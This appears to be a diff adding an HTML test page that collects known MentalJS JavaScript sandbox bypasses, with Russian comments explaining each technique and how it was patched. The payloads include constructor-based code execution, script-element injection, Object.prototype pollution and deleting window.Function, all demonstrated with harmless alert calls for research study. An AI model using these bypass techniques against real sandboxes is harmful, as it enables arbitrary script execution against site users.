@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title>MentalJS sandbox bypasses</title>
+    <script src="Mental.js" type="text/javascript"></script>
+</head>
+<body>
+    <h1>MentalJS sandbox</h1>
+    <script>
+        var aaa$ = 123;
+        var hifi = {"aaa":123};
+        var sandbox = MentalJS();
+        // Порождает заглушки для DOM, а так же добавляет возможность использования многих функций, таких как eval - которые переделаны на использование песочницы.
+        sandbox.init({
+            dom : true
+        });
+        var sandboxed_code = sandbox.parse({
+            // =========================================================================================================
+            // Для отладки, потому что когда переменная определена, то код будет выполнен, в ином случае он будет только возвращён, но без выполнения
+            //options: {eval: false},
+
+            // =========================================================================================================
+            // Включённая опция "dom" позволяет ставить заглушки при любом обращении к функциям обработки DOM, если она будет отсутствовать, то при обращении к объектам типо document, будут происходить ошибки выполнения javascript
+            // Данная dom - не влияет на ситуацию
+            //options: {eval:true, dom:true},
+
+            // =========================================================================================================
+            // Не нашёл, где бы это использовалось в коде Mental.js
+            //global: true,
+            //thisObject: hifi,
+
+
+            // =========================================================================================================
+            // Код, который мы закючаем в песочницу
+            //code:"var a = 1; ' hifi ' + aaa",
+            code:"var a = function(){}; a['cons'+'tructor']('alert(window.location)')(); Object.prototype[1] = 1",
+
+
+            // http://www.thespanner.co.uk/2014/06/24/mentaljs-bypasses/
+            /*code:"for(var i\n\
+            i/'/+alert(location);0)break//');",*/
+            // before patch: "for (var i$i$; / '/+alert(location);0)break//')"
+            // after patch: "for (var i$;i$ / '/+alert(location);0)break//');"
+
+            // ?????
+            // http://www.thespanner.co.uk/2014/06/24/mentaljs-bypasses/
+            /*code:"\
+                parent=document.getElementsByTagName('body')[0];\
+                img=document.getElementsByTagName('img')[0];\
+                x=document.createElement('script');\
+                x.innerHTML='alert(location)';\
+                parent.appendChild(x);",*/
+            // Позволяло добавить код в innerHTML свежесозданного тега script, больше не позволяет
+            // был дополнительный способ обхода - т.к. пропатчили за счёт того, что просто перекрыли innerHTML$ другим определением, то можно было убить это переопределение за счёт delete и всё бы снова работало
+            /*code: "parent=document.getElementsByTagName(‘body’)[0];\
+                    x=document.createElement(‘script’);\
+                    delete x.constructor.prototype.innerHTML;\
+                    x.innerHTML=’alert(location)';\
+                    parent.appendChild(x);";*/
+
+
+            // http://www.thespanner.co.uk/2015/03/06/mentaljs-dom-bypass/
+            // MentalJS DOM bypass
+            /*code: "s=document.createElement('script');\
+                s.insertBefore(document.createTextNode('alert(location)'),null);\
+                document.body.appendChild(s);",*/
+            // Из-за параметра null (или undefined) не происходила проверка вставляемого текста в другой script тег, что приводило к возможности вставить и выполнить в другой script тег произвольный код, уже починили
+
+
+            // http://www.thespanner.co.uk/2015/05/03/how-i-smashed-mentaljs/
+            // Из-за того, что можно иметь доступ много куда, например в prototype - то мы можем устанавливать свойства по умолчанию, для всех кроме запрещённых Mental - а это числа и то, что в названии заканчивается "$"
+            // Все настройки парсера хранятся в 2-х уровневом словаре, и позволенные значения (конструкции javascript) помечены как 1. Если пометить как 1 все остальные возможности в Object.prototype, то это эквивалентно тому, что будут возможны любые конструкции даже те, которые запрещены в обычно javascript. Это приведёт к тому, что парсер начнёт не праивльно трактовать контекст, например в данном примере он деления трактовал как регулярное выражение, и поэтому не добавлял там к концам $ и потому строка оставалась как есть и потом успешно выполнялась.
+            /*code: "for (var i=0; i<1000; i++) Object.prototype[i]=1; 3 / alert(location) / 1;",*/
+            // Вторая строка транслируется как есть, хотя должна трактоваться "3 / alert$(location$) / 1"
+
+
+            // http://www.thespanner.co.uk/2015/05/03/how-i-smashed-mentaljs/
+            // setTimeout$ - работал так: сначало подавалось исполняемое в Function$ (т.е. с санитизацией), а уже потом подавалось на setTimout настоящий
+            // Function$ - в mental описана как writable:false, но configurable:true, что позволяло её убить и потом самому переопределить, в итоге:
+            /*code: "delete window.Function;\
+                    window.Function = function(x){ return x; };\
+                    setTimeout('alert(location)', 0);",*/
+
+
+            // ?????
+            // http://www.thespanner.co.uk/2015/05/03/how-i-smashed-mentaljs/
+            // Из-за того, что при чтении unicode он всегда берёт 4 символа после "\u" - то он мог съесть " ", и трактовать всё вместе как одну лексему, хотя javascript будет трактовать как 2
+            // Так как Firefox, Chrome и IE непозволяют не полные юникодные последовательности - то атака не эксплуатируема
+            /*code: "foo\u041 bar",*/
+            // Кодируется как "foo\u041 bar$"
+            // Должно кодироваться как "foo\u041$ bar$"
+
+
+            // ?????
+            // http://www.thespanner.co.uk/2015/05/03/how-i-smashed-mentaljs/
+            // Нормализация чисел проходила не верно
+            /*code: "0e+1",*/
+            // Кодируется как: "e+1" - будет трактоваться как + переменной и 1
+            // Должно кодироваться как: "0e+1"
+            // Исправлено
+
+
+            // ?????
+            // https://twitter.com/internot_/status/260398536166887424
+            // Это исключительно случайные ошибки написания кода, опечатки
+            /*code: "(function a() /'/+alert(location)+/'/)()",*/
+            /*code: "if({}/alert(location)/+0)0",*/
+
+            // =========================================================================================================
+            // Выполнится в случае успеха выполнения данного кода
+            result:function(result){
+                alert(result)
+            },
+
+            // =========================================================================================================
+            // Выполнится всегда
+            complete:function(result){
+                // Всегда undefined
+                if (result)
+                    alert("complete + " + result);
+            }
+        });
+
+        // =============================================================================================================
+        alert("sandboxed code + \"" + sandboxed_code + "\"");
+
+    </script>
+
+</body>
+</html>
